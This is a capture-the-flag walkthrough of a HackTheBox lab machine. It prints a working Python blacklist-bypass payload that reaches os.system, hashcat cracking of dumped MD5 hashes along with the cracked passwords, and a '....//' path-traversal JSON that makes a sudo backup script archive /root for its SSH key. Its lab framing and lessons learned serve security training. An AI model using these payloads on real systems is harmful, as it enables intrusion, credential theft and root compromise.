
# HTB - Code

## Machine Information

| Information      | Details                                                                           |
| ---------------- | --------------------------------------------------------------------------------- |
| Machine          | Code                                                                              |
| IP Address       | 10.129.231.240                                                                    |
| Operating System | Linux                                                                             |
| Difficulty       | Easy                                                                              |
| Main Services    | SSH, HTTP                                                                         |
| Attack Path      | SSTI → RCE → SQLite → Credential Reuse → SSH → Sudo Abuse → Path Traversal → Root |

# 1. Reconnaissance

We begin with a full TCP port scan to identify all exposed services.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG Allports 10.129.231.240
```

The scan returned two open ports:

```text
# Nmap 7.991 scan initiated Sat Oct  3 20:38:30 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG Allports 10.129.231.240
# Ports scanned: TCP(65535;1-65535 UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.231.240 ()	Status: Up
Host: 10.129.231.240 ()	Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///
# Nmap done at Sat Oct  3 20:38:49 2026 -- 1 IP address (1 host up) scanned in 18.21 seconds
```

The exposed services are:

* `22/tcp`: SSH
* `5000/tcp`: HTTP service

As usual, after discovering the ports, we perform a more targeted scan to identify service versions and run the default NSE scripts.

```bash
nmap -sCV -p22,5000 10.129.231.240
```

Port 5000 is identified as an HTTP service, so we move our enumeration to the web application.

# 2. Web Enumeration

The machine resolves to `code.htb`, so we add the hostname to `/etc/hosts`.

```bash
echo "10.129.231.240 code.htb" | sudo tee -a /etc/hosts
```

This adds the following entry:

```text
10.129.231.240 code.htb
```

When accessing the web application, we find a page containing a code runner.

A code execution interface immediately raises the possibility of server-side template injection or another form of server-side code execution.

We initially test whether we can directly import Python modules and execute commands such as `whoami` or `ls -l`.

However, the application returns an error indicating that restricted keywords are being detected.

This suggests that the application is not preventing code execution itself, but instead is attempting to filter certain dangerous Python keywords.

Therefore, instead of abandoning the code execution functionality, we enumerate possible ways to bypass the blacklist.

# 3. SSTI Filter Bypass

The application is vulnerable to Server-Side Template Injection (SSTI).

The blacklist can be bypassed by accessing Python internals indirectly and constructing restricted strings dynamically.

The following payload allows us to obtain the `system` function:

```python
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter']
[0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']
('whoami')
```

The important part of the payload is that restricted strings such as `sys`, `os`, and `system` are constructed dynamically.

Instead of writing:

```python
os.system()
```

we access Python's internal objects and build the restricted names using string concatenation.

The final call:

```python
('whoami')
```

executes the command through `os.system`.

The application returns the expected result, confirming arbitrary command execution.

At this point, the SSTI vulnerability has effectively become remote code execution.

# 4. Confirming Outbound Connectivity

Before attempting a reverse shell, we verify whether the target can establish a connection back to our machine.

We start a listener with `tcpdump` and make the target perform a `curl` request to our machine.

The connection is received successfully, confirming outbound network connectivity.

Since we now know that the target can reach us, we can move from command execution to a reverse shell.

When sending the reverse shell through the web application, special characters such as `&` and `>` may need to be URL encoded.

After executing the payload, we receive a shell as:

```text
app-production
```

We now have our initial foothold on the machine.

# 5. Enumerating the Application

After obtaining the shell, we begin enumerating the filesystem.

```bash
ls -l
```

We find an `instance` directory.

This is interesting because Flask applications commonly store their SQLite databases inside an `instance` directory.

We enter the directory:

```bash
cd instance
```

Inside, we find:

```text
database.db
```

We inspect the database with SQLite.

```bash
sqlite3 database.db
```

First, we list the available tables:

```sql
.tables
```

The application contains:

```text
code
user
```

The `user` table is particularly interesting because it may contain application credentials.

We query it:

```sql
select * from user;
```

The result is:

```text
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

We have two usernames and their corresponding MD5 hashes:

```text
development:759b74ce43947f5f4c91aeddc3e5bad3
martin:3de6f30c4a09c27fc71932bfc68474be
```

# 6. Cracking the Passwords

We can use CrackStation or crack the hashes locally with Hashcat.

```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

The hashes are successfully cracked:

```text
martin:nafeelswordsmaster
development:development
```

The `martin` credentials are particularly interesting because we have already identified SSH on port 22.

Before attempting SSH authentication, we check which application users have a valid login shell.

```bash
cat /etc/passwd | grep bash
```

The `martin` user has a Bash shell, meaning SSH access is possible.

We therefore authenticate using the recovered credentials.

```bash
ssh martin@10.129.231.240
```

We now have an authenticated SSH session as `martin`.

# 7. Privilege Escalation Enumeration

We check the commands available to `martin` through sudo.

```bash
sudo -l
```

The output is:

```text
Matching Defaults entries for martin on localhost:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s
nap/bin
User martin may run the following commands on localhost:
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

This is immediately interesting.

`martin` can execute `/usr/bin/backy.sh` as root without providing a password.

We therefore inspect the script.

```bash
cat /usr/bin/backy.sh
```

The script contains:

```bash
#!/bin/bash
if [[ $# -ne 1 ]]; then
/usr/bin/echo "Usage: $0 <task.json>"
exit 1
fi
json_file="$1"
if [[ ! -f "$json_file" ]]; then
/usr/bin/echo "Error: File '$json_file' not found."
exit 1
fi
allowed_paths=("/var/" "/home/")
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'
"$json_file")
/usr/bin/echo "$updated_json" > "$json_file"
directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r
'.directories_to_archive[]')
is_allowed_path() {
local path="$1"
for allowed_path in "${allowed_paths[@]}"; do
if [[ "$path" == $allowed_path* ]]; then
return 0
fi
done
return 1
}
for dir in $directories_to_archive; do
if ! is_allowed_path "$dir"; then
/usr/bin/echo "Error: $dir is not allowed. Only directories under /var/
and /home/ are allowed."
exit 1
fi
done
```

The script is intended to create backups from directories specified in a JSON file.

It attempts to prevent path traversal with:

```bash
gsub("\\.\\./"; "")
```

This removes occurrences of:

```text
../
```

from the supplied paths.

It then checks that every directory starts with either:

```text
/var/
```

or:

```text
/home/
```

At first glance, this looks reasonably restrictive.

However, the sanitization itself is flawed.

# 8. Inspecting the Backup Task

In our current working directory, we find a JSON task file.

```bash
cat task.json
```

The contents are:

```json
{
"destination": "/home/martin/backups/",
"multiprocessing": true,
"verbose_log": false,
"directories_to_archive": [
"/home/app-production/app"
],
"exclude": [
".*"
]
}
```

The important field is:

```json
"directories_to_archive": [
"/home/app-production/app"
]
```

This tells `backy.sh` which directories should be included in the backup.

Since the script runs as root, if we can manipulate this path validation, we may be able to make the backup process read directories that `martin` normally cannot access.

# 9. Path Traversal Restriction Bypass

The filtering removes the literal sequence:

```text
../
```

However, it does not account for another representation of the same traversal concept.

We can therefore use:

```text
....//
```

After the sanitization removes one `../` sequence, the remaining characters can still resolve to a parent-directory traversal.

We modify the task to:

```json
{
"destination": "/home/martin",
"multiprocessing": true,
"verbose_log": true,
"directories_to_archive": [
"/home/....//root/"
]
}
```

The important payload is:

```text
/home/....//root/
```

This bypasses the intended path traversal restriction while still satisfying the script's initial `/home/` prefix check.

The backup script subsequently resolves the path and processes the `/root/` directory as root.

# 10. Executing the Backup Script

We execute the script through sudo:

```bash
sudo /usr/bin/backy.sh task.json
```

The backup is successfully created.

Because the script is running with root privileges, the resulting archive contains files from `/root/`.

This gives us access to sensitive files that `martin` could not normally read, including the root user's SSH private key and the root flag.

# 11. Obtaining a Root Shell

Once the root user's SSH private key has been extracted, we can use it to authenticate directly as root.

After saving the private key locally, we set the appropriate permissions:

```bash
chmod 600 rsa.id
```

We can then connect as root:

```bash
ssh -i rsa.id root@localhost
```

This provides a root shell.

Alternatively, the root flag can simply be read directly from the extracted root directory.

# Attack Path

```text
Port Scan
    |
    v
HTTP on 5000
    |
    v
code.htb
    |
    v
Code Runner
    |
    v
SSTI
    |
    v
Blacklist Bypass
    |
    v
Remote Code Execution
    |
    v
Reverse Shell as app-production
    |
    v
SQLite database
    |
    v
MD5 Credential Hashes
    |
    v
Cracked martin Password
    |
    v
SSH as martin
    |
    v
sudo -l
    |
    v
backy.sh
    |
    v
Path Traversal Sanitization Bypass
    |
    v
Backup of /root
    |
    v
Root SSH Private Key
    |
    v
SSH as root
```

# Vulnerabilities & Techniques

## Server-Side Template Injection

The code runner evaluates attacker-controlled input as a server-side template, allowing arbitrary Python functionality to be accessed.

## SSTI Blacklist Bypass

The application attempts to restrict dangerous keywords, but the blacklist can be bypassed by accessing Python internals and dynamically constructing restricted strings.

## Remote Code Execution

The SSTI vulnerability allows arbitrary operating-system commands to be executed on the target.

## Sensitive Information Disclosure

The application's SQLite database contains usernames and password hashes.

## Weak Passwords

The recovered MD5 hashes can be cracked using common password dictionaries.

## Credential Reuse

The recovered `martin` password provides access to SSH.

## Sudo Misconfiguration

`martin` can execute `/usr/bin/backy.sh` as root without a password:

```text
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

## Path Traversal

The backup script attempts to sanitize `../`, but the filtering can be bypassed using an alternative path representation.

## Privileged File Disclosure

Because the vulnerable backup script executes as root, the traversal allows us to archive `/root/` and retrieve sensitive root-owned files.

## SSH Private Key Exposure

The backup contains the root user's private SSH key, allowing direct authentication as root.

# Lessons Learned

* A blacklist is not a reliable security mechanism for restricting code execution.
* SSTI vulnerabilities can often be escalated from template manipulation to full RCE.
* Application databases should never contain weak or easily crackable passwords.
* Password reuse can turn an application credential into an SSH foothold.
* Sudo permissions should be reviewed carefully, especially when the allowed program accepts attacker-controlled files or paths.
* Sanitizing `../` is not sufficient protection against path traversal.
* Backup utilities are particularly dangerous when they process user-controlled paths with elevated privileges.
* A root-running backup process can become a privilege escalation vector if path validation is incomplete.
* Sensitive files such as SSH private keys should never become accessible through untrusted backup functionality.

pwned :)))))
